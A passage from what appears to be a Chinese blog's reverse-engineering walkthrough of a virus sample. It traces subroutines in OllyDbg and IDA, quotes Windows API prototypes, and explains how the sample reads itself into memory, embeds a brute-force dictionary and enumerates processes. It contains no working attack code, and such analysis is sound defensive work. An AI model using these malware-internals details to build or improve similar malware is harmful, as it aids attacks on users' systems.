*this)</span></span><br></pre></td></tr></table></figure><p><code>__thiscall</code>的主要特征是：</p><ul><li>由被调用者清除堆栈</li><li>参数从右往左依次入栈</li><li>this指针通过ECX传递，而不是用栈</li></ul><p>在这个函数中，有非常多的子函数，接下来逐一分析。</p><h3 id="6-1-1-sub-40277C"><a href="#6-1-1-sub-40277C" class="headerlink" title="6.1.1 sub_40277C"></a>6.1.1 sub_40277C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_40277C@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, _DWORD *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.1.png" class="" title="sub_40277C()函数分析"><img src="/posts/a48809a5/6.1.2.png" class="" title="sub_40277C()函数分析"><p><code>sub_40277C()</code>函数中有两个API函数：<code>GetModuleFileName()</code>和<code>GetCommandLine()</code>。</p><p><code>GetModuleFileName()</code>的功能是获取当前进程已加载模块的文件的完整路径，该模块必须由当前进程加载。如果想要获取另一个已加载模块的文件路径，可以使用<code>GetModuleFileNameEx()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI <span class="title function_">GetModuleFileName</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_opt_  HMODULE hModule,</span></span><br><span class="line"><span class="params">    _Out_     LPTSTR lpFilename,</span></span><br><span class="line"><span class="params">    _In_      DWORD nSize</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hModule：Long类型，一个模块的句柄。可以是一个DLL模块，或者是一个应用程序的实例句柄。如果该参数为NULL，该函数返回该应用程序全路径。</li><li>lpFileName：String类型，指定一个字串缓冲区，要在其中容纳文件的用NULL字符中止的路径名，<code>hModule</code>模块就是从这个文件装载进来的。</li><li>nSize：Long类型，装载到缓冲区<code>lpFileName</code>的最大字符数量。</li></ul><p>返回值：Long，如执行成功，返回复制到<code>lpFileName</code>的实际字符数量；零表示失败。使用<code>GetLastError()</code>可以打印错误信息。</p><p><code>GetCommandLine()</code>的功能是获得指向当前命令行缓冲区的一个指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPTSTR <span class="title function_">GetCommandLine</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>无参数，返回值是一个指向当前进程的命令行字符串的指针。</p><p>当执行完<code>GetModuleFileName()</code>函数后，在数据窗口可以看到该程序的绝对路径，并且绕过了<code>GetCommandLine()</code>。根据地址402792那一行的jnz跳转指令可知，<code>sub_40277C()</code>的功能是要么获取当前程序绝对路径，要么获取当前命令行缓冲区的指针。</p><img src="/posts/a48809a5/6.1.3.png" class="" title="sub_40277C()函数分析"><p>将该函数重命名为<code>GetFilePathAndName()</code>。</p><h3 id="6-1-2-sub-405684"><a href="#6-1-2-sub-405684" class="headerlink" title="6.1.2 sub_405684"></a>6.1.2 sub_405684</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_405684@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.4.png" class="" title="sub_405684()函数分析"><p>进入<code>sub_405684()</code>函数，发现一个小循环，遇到斜杠、反斜杠或冒号则跳出循环。它的目的要么是想不包含病毒文件名的路径，要么想获取样本的名字。</p><img src="/posts/a48809a5/6.1.5.png" class="" title="sub_405684()函数分析"><p>来到地址4056D8时，这三个寄存器存的值的含义如下：</p><p>EAX存的是绝对路径；ECX存的是在绝对路径中程序名的索引值；EDX被置为1，暂时不知道有什么含义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__userpurge sub_40412C@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;, _DWORD *a4)</span><br></pre></td></tr></table></figure><p><code>__userpurge</code>和<code>__usercall</code>一样，都是用户自定义函数调用约定，唯一的区别是<code>__userpurge</code>表示<strong>由被调用者清理堆栈</strong>。</p><p>进入<code>sub_40412C()</code>函数，有两个子函数分别是<code>sub_403D34()</code>和<code>sub_403C44()</code>，这两个函数前面都有分析过，<code>sub_403D34()</code>分配一定大小的内存空间，进行字符串拷贝。<code>sub_403C44()</code>初始化寄存器。</p><img src="/posts/a48809a5/6.1.6.png" class="" title="sub_40412C()函数分析"><p>发现<code>sub_405684()</code>其实是想获取不包含病毒文件名的路径，将它更名为<code>GetFilePath()</code>。</p><h4 id="6-1-2-1-局部变量"><a href="#6-1-2-1-局部变量" class="headerlink" title="6.1.2.1 局部变量"></a>6.1.2.1 局部变量</h4><p>在<code>sub_405684()</code>函数里，可以看到一些局部变量。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040568C  |.  8945 FC       mov [local.1],eax</span><br><span class="line">0040568F  |.  8B45 FC       mov eax,[local.1]</span><br></pre></td></tr></table></figure><p>[local.1]表示第一个局部变量，存放在栈里的[ebp-4]的位置。</p><img src="/posts/a48809a5/6.1.7.png" class="" title="sub_405684()函数分析"><p>以此类推，[local.2]存放在[ebp-8]的位置。</p><p>如果想让它直接显示与ebp的偏移，可在选项 -&gt; 调试设置 -&gt; 分析1 -&gt; 取消勾选“显示函数中的参数及局部变量”。或者选中相应行，按空格键查看汇编代码。</p><img src="/posts/a48809a5/6.1.8.png" class=""><h3 id="6-1-3-sub-403ED4"><a href="#6-1-3-sub-403ED4" class="headerlink" title="6.1.3 sub_403ED4"></a>6.1.3 sub_403ED4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__usercall sub_403ED4@&lt;eax&gt;(<span class="type">char</span> **result@&lt;eax&gt;, <span class="type">char</span> *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.9.png" class="" title="sub_403ED4()函数分析"><p>这个函数在5.2.2.2也分析过，但当时只是初始化，了解得很笼统。但结合实例很容易分析出来这是一个字符串拼接函数。</p><img src="/posts/a48809a5/6.1.10.png" class="" title="sub_403ED4()函数分析"><p>将<code>sub_403ED4()</code>更名为<code>StringCat()</code>。</p><h3 id="6-1-4-sub-4057A4"><a href="#6-1-4-sub-4057A4" class="headerlink" title="6.1.4 sub_4057A4"></a>6.1.4 sub_4057A4</h3><p>进入无需传参的<code>sub_4057A4()</code>，有一个子函数<code>sub_40573C()</code>也无需传参，继续进入，发现有4个API函数。</p><p><code>FindFirstFile()</code>查找指定目录的第一个文件或目录并返回它的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">FindFirstFileA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  LPCSTR             lpFileName,</span></span><br><span class="line"><span class="params">  [out] LPWIN32_FIND_DATA  lpFindFileData</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpFileName：指向字符串的指针，用于指定一个有效的目录。</li><li>lpFindFileData：指向一个<code>WIN32_FIND_DATA</code>的指针，用于存放找到文件或目录的信息。</li></ul><p>返回值：</p><ul><li>如果成功，则返回找到文件或目录的句柄。在<code>FindNextFile()</code>和<code>FindClose()</code>函数中会用到此句柄。</li><li>如果失败，返回<code>INVALID_HANDLE_VALUE</code>。要获得更多的信息调用<code>GetLastError()</code>函数。</li></ul><p><code>FindClose()</code>用于关闭由<code>FindFirstFile()</code>函数创建的一个搜索句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">FindClose</span><span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE hFindFile <span class="comment">// file search handle</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hFindFile：<code>FindFirstFile()</code>创建的句柄。</li></ul><p>返回值：</p><ul><li>调用成功，返回一个非0值。</li><li>失败，返回0，可利用<code>GetLastError()</code>来得到错误信息。</li></ul><p><code>FileTimeToLocalFileTime()</code>将一个FILETIME结构转换成本地时间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">FileTimeToLocalFileTime</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  <span class="type">const</span> FILETIME* lpFileTime,</span></span><br><span class="line"><span class="params">  [out] LPFILETIME lpLocalFileTime</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpFileTime：指向FILETIME结构，其中包含要转换为本地文件时间的基于UTC的文件时间。</li><li>lpLocalFileTime：指向FILETIME结构的指针，以接收转换后的本地文件时间。</li></ul><p>返回值：非0表示成功，0表示失败。</p><p><code>FileTimeToDosDateTime()</code>将一个 FILETIME 值转换成 MS-DOS 日期和时间值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">FileTimeToDosDateTime</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  <span class="type">const</span> FILETIME *lpFileTime,</span></span><br><span class="line"><span class="params">  [out] LPWORD         lpFatDate,</span></span><br><span class="line"><span class="params">  [out] LPWORD         lpFatTime</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><p>lpFileTime：指向 FILETIME 结构的指针，其中包含要转换为 MS-DOS 日期和时间格式的文件时间。</p></li><li><p>lpFatDate：指向接收MS-DOS日期的变量的指针。日期是以下格式的压缩值。</p><p>| 比特 | 说明                                                |<br>| —— | —————————————————————————- |<br>| 0-4  | Day of the month (1–31)                             |<br>| 5-8  | Month (1 = January, 2 = February, etc.)             |<br>| 9-15 | Year offset from 1980 (add 1980 to get actual year) |</p></li><li><p>lpFatTime：指向接收MS-DOS时间的变量的指针。时间是以下格式的压缩值。</p><p>| 比特 | 说明                           |<br>| —— | ——————————————— |<br>| 0-4  | 秒除以2                        |<br>| 5-8  | Minute (0–59)                  |<br>| 9-15 | Hour (0–23 on a 24-hour clock) |</p></li></ul><p>返回值：非0表示成功，0表示失败。</p><p>这就很好懂啦，整个<code>sub_4057A4()</code>做的就是某个检查文件是否存在当前目录，如果存在则转换成文件的本地时间和DOS日期。将它更名为<code>CheckFileExist()</code>。</p><h3 id="6-1-5-sub-4078E0"><a href="#6-1-5-sub-4078E0" class="headerlink" title="6.1.5 sub_4078E0"></a>6.1.5 sub_4078E0</h3><p>由于当前没有<code>Desktop_.ini</code>文件，所以下面的一系列call也都被跳过了。我们先跟着流程跳过，稍后回来到这里再分析它们。</p><img src="/posts/a48809a5/6.1.11.png" class="" title="sub_408024()函数分析"><p>再次调用<code>sub_40277C()</code>，也就是<code>GetFilePathAndName()</code>后，调用<code>sub_4078E0()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_4078E0@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">char</span> **a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ebx&gt;, <span class="type">int</span> a4@&lt;edi&gt;, <span class="type">int</span> a5@&lt;esi&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.12.png" class="" title="sub_4078E0()函数分析"><h4 id="6-1-5-1-sub-402EB8"><a href="#6-1-5-1-sub-402EB8" class="headerlink" title="6.1.5.1 sub_402EB8"></a>6.1.5.1 sub_402EB8</h4><p>进去到<code>sub_402EB8()</code>后只有一个函数<code>sub_402DD8()</code>。进去发现又是API函数。</p><p><code>CreateFile()</code>创建或打开文件，<code>GetStdHandle()</code>获取句柄，<code>GetLastError()</code>收集错误信息。</p><img src="/posts/a48809a5/6.1.13.png" class="" title="sub_402DD8()函数分析"><p>发现它打开了它自己<code>setup.exe</code>。</p><h4 id="6-1-5-2-sub-402614"><a href="#6-1-5-2-sub-402614" class="headerlink" title="6.1.5.2 sub_402614"></a>6.1.5.2 sub_402614</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __thiscall __spoils&lt;ecx&gt; <span class="title function_">sub_402614</span><span class="params">(<span class="type">void</span> *this)</span></span><br></pre></td></tr></table></figure><p>如果使用<code>__spoils</code>关键字，指定的列表将覆盖标准的破坏列表。对于x86，标准的破坏列表是<eax, edx, ecx>，破坏列表也可以为空。</p><p>进入该函数里面只有一个函数<code>sub_40499C()</code>，里面只有一个API函数<code>TlsGetValue()</code>，该API函数的作用是检索调用线程的线程本地存储(TLS)槽中指定 TLS 索引的值。进程的每个线程对于每个 TLS 索引都有自己的槽。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPVOID <span class="title function_">TlsGetValue</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwTlsIndex</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>dwTlsIndex：由<code>TlsAlloc()</code>函数分配的TLS索引。</li></ul><p>返回值：</p><ul><li>如果函数成功，则返回值是存储在与指定索引关联的调用线程TLS插槽中的值。如果<code>dwTlsIndex</code>是成功调用<code>TlsAlloc()</code>分配的有效索引，则此函数始终成功。</li><li>如果函数失败，则返回值为零。要获取扩展的错误信息，请调用<code>GetLastError()</code>。</li></ul><p>当然这个API函数基本上都被跳过了，因为前面都没有用到<code>TlsAlloc()</code>函数。</p><h4 id="6-1-5-3-sub-402D28"><a href="#6-1-5-3-sub-402D28" class="headerlink" title="6.1.5.3 sub_402D28"></a>6.1.5.3 sub_402D28</h4><p>里面有个API函数<code>GetFileSize()</code>用来获取文件大小。文件大小为0xEC00。</p><img src="/posts/a48809a5/6.1.21.png" class="" title="sub_402D28()函数分析"><h4 id="6-1-5-4-sub-402CBC"><a href="#6-1-5-4-sub-402CBC" class="headerlink" title="6.1.5.4 sub_402CBC"></a>6.1.5.4 sub_402CBC</h4><p>里面有两个函数：<code>sub_402CD8()</code>和<code>sub_402D28()</code>。后者已经在上面分析过了。<code>sub_402CD8()</code>里有个API函数<code>SetFilePointer()</code>，用来设置文件指针。</p><h4 id="6-1-5-5-sub-402C28"><a href="#6-1-5-5-sub-402C28" class="headerlink" title="6.1.5.5 sub_402C28"></a>6.1.5.5 sub_402C28</h4><p>在这个函数里面，可以看到将<code>ReadFile()</code>函数入栈，调用<code>sub_402B9C()</code>。</p><img src="/posts/a48809a5/6.1.14.png" class="" title="sub_402C28()函数分析"><p>进入<code>sub_402B9C()</code>，执行<code>ReadFile()</code>函数。这里的[arg.2]表示[ebp+0xC]。</p><img src="/posts/a48809a5/6.1.15.png" class="" title="sub_402C28()函数分析"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE hFile,            <span class="comment">//文件的句柄</span></span></span><br><span class="line"><span class="params">    LPVOID lpBuffer,          <span class="comment">//用于保存读入数据的一个缓冲区</span></span></span><br><span class="line"><span class="params">    DWORD nNumberOfBytesToRead,    <span class="comment">//要读入的字节数</span></span></span><br><span class="line"><span class="params">    LPDWORD lpNumberOfBytesRead,    <span class="comment">//指向实际读取字节数的指针</span></span></span><br><span class="line"><span class="params">    LPOVERLAPPED lpOverlapped</span></span><br><span class="line"><span class="params">    <span class="comment">//如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。</span></span></span><br><span class="line"><span class="params">    <span class="comment">//该结构定义了一次异步读取操作。否则，应将这个参数设为NULL</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>可以看到它将自己读到了内存中去。</p><img src="/posts/a48809a5/6.1.16.png" class="" title="sub_402C28()函数分析"><h4 id="6-1-5-6-sub-403D34、sub-403ED4和sub-402CBC"><a href="#6-1-5-6-sub-403D34、sub-403ED4和sub-402CBC" class="headerlink" title="6.1.5.6 sub_403D34、sub_403ED4和sub_402CBC"></a>6.1.5.6 sub_403D34、sub_403ED4和sub_402CBC</h4><p>这三个函数上面都有分析过，<code>sub_403D34()</code>是<code>StringCopy()</code>，<code>sub_403ED4()</code>是<code>StringCat()</code>，<code>sub_402CBC()</code>设置文件指针。</p><p>发现这是一个循环，在跳转处下断点，关注数据窗口发现有哪些数据被修改了。</p><img src="/posts/a48809a5/6.1.17.png" class="" title="循环分析"><p>第一次，将自己一部分写入到内存中：</p><img src="/posts/a48809a5/6.1.18.png" class="" title="循环分析"><p>第二次，继续将自己一部分写入到内存中：</p><img src="/posts/a48809a5/6.1.19.png" class="" title="循环分析"><p>第三次，将剩下的部分写入到内存中：</p><img src="/posts/a48809a5/6.1.20.png" class="" title="循环分析"><p>结合循环中的汇编代码分析，文件大小为0xEC00，每次读取0x5000进行拷贝和拼接，所以这个循环是将自身读到内存中去。</p><p>其中，我们可以看到一些“1234”等等的字符串，那是病毒作者将爆破字典也写入到了病毒里面，企图利用暴力破解的方式来攻破计算机中的某些验证机制。</p><h4 id="6-1-5-7-sub-402C48"><a href="#6-1-5-7-sub-402C48" class="headerlink" title="6.1.5.7 sub_402C48"></a>6.1.5.7 sub_402C48</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_402C48@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.22.png" class="" title="sub_402C48()函数分析"><p>进入后，继续进入<code>sub_402DB0()</code>，继续进入<code>sub_4028FC()</code>，里面有个<code>CloseHandle()</code>函数，用来关闭我们刚才打开的程序。其它函数都不太重要，不用在意。</p><h4 id="6-1-5-8-sub-403ECC、sub-40412C和sub-403C44"><a href="#6-1-5-8-sub-403ECC、sub-40412C和sub-403C44" class="headerlink" title="6.1.5.8 sub_403ECC、sub_40412C和sub_403C44"></a>6.1.5.8 sub_403ECC、sub_40412C和sub_403C44</h4><p><code>sub_403ECC()</code>函数是求字符串长度的，在这里是求三次循环后复制的字符串长度，应该为0xF000。执行完这个函数后，与文件大小0xEC00相比，跳转未实现，需要进入<code>sub_40412C()</code>函数。</p><img src="/posts/a48809a5/6.1.23.png" class="" title="sub_403ECC()函数分析"><p><code>sub_40412C()</code>函数我们也分析过，它里面有个函数是<code>StringCopy()</code>。</p><img src="/posts/a48809a5/6.1.24.png" class="" title="sub_40412C()函数分析"><p><code>sub_403C44()</code>也分析过，初始化寄存器。</p><img src="/posts/a48809a5/6.1.25.png" class="" title="sub_403C44()函数分析"><h4 id="6-1-5-9-总结"><a href="#6-1-5-9-总结" class="headerlink" title="6.1.5.9 总结"></a>6.1.5.9 总结</h4><p>至此，<code>sub_4078E0()</code>就全分析完了，样本将自己读取到内存上，是因为样本中有爆破字典，企图利用暴力破解的方式来攻破计算机中的某些验证机制。</p><p>将该函数更名为<code>WriteVirusInfoToMem()</code>。</p><h3 id="6-1-6-sub-40532C"><a href="#6-1-6-sub-40532C" class="headerlink" title="6.1.6 sub_40532C"></a>6.1.6 sub_40532C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD __usercall sub_40532C@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">char</span> **a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p><code>sub_403ECC()</code>求文件绝对路径的长度，<code>sub_403D34()</code>是<code>StringCopy()</code>，还有个API函数，<code>CharUpperBuff()</code>表示将字符串中的小写字母全都转化为大写字母。</p><img src="/posts/a48809a5/6.1.26.png" class="" title="sub_40532C()函数分析"><p>所以这个函数的功能是将文件路径改为大写字母，更名为<code>UpperFilePath()</code>。</p><h3 id="6-1-7-sub-4054BC"><a href="#6-1-7-sub-4054BC" class="headerlink" title="6.1.7 sub_4054BC"></a>6.1.7 sub_4054BC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__usercall sub_4054BC@&lt;eax&gt;(<span class="type">int</span> *a1@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.27.png" class="" title="sub_4054BC()函数分析"><p>这里有个API函数<code>GetSystemDirectoryA()</code>，原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UINT WINAPI <span class="title function_">GetSystemDirectory</span><span class="params">(</span></span><br><span class="line"><span class="params">    __out LPTSTR lpBuffer,</span></span><br><span class="line"><span class="params">    __in UINT uSize</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpBuffer：用于装载系统目录路径名的一个字串缓冲区。</li><li>uSize：lpBuffer字串的最大长度。</li></ul><p>返回值：装载到lpBuffer缓冲区的字符数量。如lpBuffer不够大，不能容下文件名，则返回要求的缓冲区长度。</p><p>它的作用是获得系统目录<code>C:\WINDOWS\system32</code>，同时也是这个函数的主要功能。将它更名为<code>GetSystemDirectory()</code>。</p><h3 id="6-1-8-sub-403F8C"><a href="#6-1-8-sub-403F8C" class="headerlink" title="6.1.8 sub_403F8C"></a>6.1.8 sub_403F8C</h3><img src="/posts/a48809a5/6.1.28.png" class="" title="sub_403F8C()函数分析"><p>从IDA中可以很容易理解<code>sub_403F8C()</code>函数的作用，也就是将这三个字符串拼接成路径的地址存到v8当中。</p><p>为了验证猜想，在OD中步过<code>sub_403F8C()</code>试试。</p><img src="/posts/a48809a5/6.1.29.png" class="" title="sub_403F8C()函数分析"><img src="/posts/a48809a5/6.1.30.png" class="" title="sub_403F8C()函数分析"><img src="/posts/a48809a5/6.1.31.png" class="" title="sub_403F8C()函数分析"><p>所以这个函数也可以看成是字符串拼接函数，它是从后往前拼接的，更名为<code>ReverseStringCat()</code>。</p><h3 id="6-1-9-sub-4060D4"><a href="#6-1-9-sub-4060D4" class="headerlink" title="6.1.9 sub_4060D4"></a>6.1.9 sub_4060D4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__usercall sub_4060D4@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.32.png" class="" title="sub_4060D4()函数分析"><h4 id="6-1-9-1-sub-405028"><a href="#6-1-9-1-sub-405028" class="headerlink" title="6.1.9.1 sub_405028"></a>6.1.9.1 sub_405028</h4><p>进入函数内部，进入<code>sub_405028()</code>，再进入<code>sub_404DAC()</code>，看到一连串的API函数。</p><img src="/posts/a48809a5/6.1.33.png" class="" title="sub_404DAC()函数分析"><p>使用<code>GetModuleHandleA()</code>获取<code>kernel32.dll</code>的句柄，再利用<code>kernel32.dll</code>中的<code>GetProcAddress()</code>函数获取所需要的API函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC <span class="title function_">GetProcAddress</span><span class="params">(</span></span><br><span class="line"><span class="params">    HMODULE hModule, <span class="comment">// DLL模块句柄</span></span></span><br><span class="line"><span class="params">    LPCSTR lpProcName <span class="comment">// 函数名</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hModule：[in] 包含此函数的DLL模块的句柄。<code>LoadLibrary()</code>、<code>AfxLoadLibrary()</code>或者<code>GetModuleHandle()</code>函数可以返回此句柄。</li><li>lpProcName：[in] 包含函数名的以NULL结尾的字符串，或者指定函数的序数值。如果此参数是一个序数值，它必须在低字，高字必须为0。</li></ul><p>返回值：</p><ul><li>如果函数调用成功，返回值是DLL中的输出函数地址。</li><li>如果函数调用失败，返回值是NULL。得到进一步的错误信息，调用函数GetLastError。</li></ul><p>可以看到它调用了非常多的API函数，各API函数的功能如下：</p><div class="table-container"><table><thead><tr><th>API函数</th><th>功能</th></tr></thead><tbody><tr><td>CreateToolhelp32Snapshot</td><td>通过获取进程信息为指定的进程、进程使用的堆、模块、线程建立一个快照。</td></tr><tr><td>Heap32ListFirst</td><td>检索有关指定进程已分配的第一个堆的信息。</td></tr><tr><td>Heap32ListNext</td><td>检索有关进程已分配的下一个堆的信息。</td></tr><tr><td>Heap32First</td><td>检索有关已由进程分配的堆的第一个块的信息。</td></tr><tr><td>Heap32Next</td><td>检索有关已由进程分配的堆的下一个块的信息。</td></tr><tr><td>Toolhelp32ReadProcessMemory</td><td>将分配给另一个进程的内存复制到应用程序提供的缓冲区中。</td></tr><tr><td>Process32First/Process32FirstW</td><td>检索有关系统快照中遇到的第一个进程的信息。</td></tr><tr><td>Process32Next/Process32NextW</td><td>检索有关系统快照中记录的下一个进程的信息。</td></tr><tr><td>Thread32First</td><td>检索有关系统快照中遇到的任何进程的第一个线程的信息。</td></tr><tr><td>Thread32Next</td><td>检索有关系统内存快照中遇到的任何进程的下一个线程的信息。</td></tr><tr><td>Module32First/Module32FirstW</td><td>检索有关与进程关联的第一个模块的信息。</td></tr><tr><td>Module32Next/Module32NextW</td><td>检索有关与进程或线程关联的下一个模块的信息。</td></tr></tbody></table></div><p>将这些API函数的地址存到用户程序的某个地方。</p><img src="/posts/a48809a5/6.1.34.png" class="" title="sub_404DAC()函数分析"><p>存好后执行<code>CreateToolhelp32Snapshot()</code>获取当前进程快照。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateToolhelp32Snapshot</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwFlags,</span></span><br><span class="line"><span class="params">  [in] DWORD th32ProcessID</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.35.png" class="" title="sub_405028()函数分析"><p>Flags为2表示在快照中包含系统中的所有进程。要枚举这些进程，请参见 <code>Process32First()</code>。 ProcessID为0表示当前进程。如果调用成功，返回快照的句柄，此快照的句柄为0x98。</p><p>将它更名为<code>CreateSnapshot()</code>。</p><h4 id="6-1-9-2-sub-405048"><a href="#6-1-9-2-sub-405048" class="headerlink" title="6.1.9.2 sub_405048"></a>6.1.9.2 sub_405048</h4><p>跟<code>sub_405028()</code>一样调用<code>sub_404DAC()</code>，但这次用的是<code>Process32First()</code>，用来检索有关系统快照中遇到的第一个进程的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">Process32First</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HANDLE           hSnapshot,</span></span><br><span class="line"><span class="params">  [in, out] LPPROCESSENTRY32 lppe</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hSnapshot：从上次调用<code>CreateToolhelp32Snapshot()</code>函数返回的快照句柄。</li><li>lppe：指向PROCESSENTRY32结构的指针。它包含进程信息，如可执行文件的名称、进程标识符和父进程的进程标识符。</li></ul><img src="/posts/a48809a5/6.1.36.png" class="" title="sub_405048()函数分析"><p>将它更名为<code>ProcessFirst()</code>。</p><h4 id="6-1-9-3-sub-406028"><a href="#6-1-9-3-sub-406028" class="headerlink" title="6.1.9.3 sub_406028"></a>6.1.9.3 sub_406028</h4><p>进入循环，先看<code>sub_406028()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_406028@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, _DWORD *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.37.png" class="" title="sub_4060D4()函数分析"><p>进入<code>sub_406028()</code>函数，可以看到这也是一个字符串拷贝函数，将eax存的内容拷贝到edx存的地址处。</p><img src="/posts/a48809a5/6.1.38.png" class="" title="sub_406028()函数分析"><h4 id="6-1-9-4-sub-405FA8"><a href="#6-1-9-4-sub-405FA8" class="headerlink" title="6.1.9.4 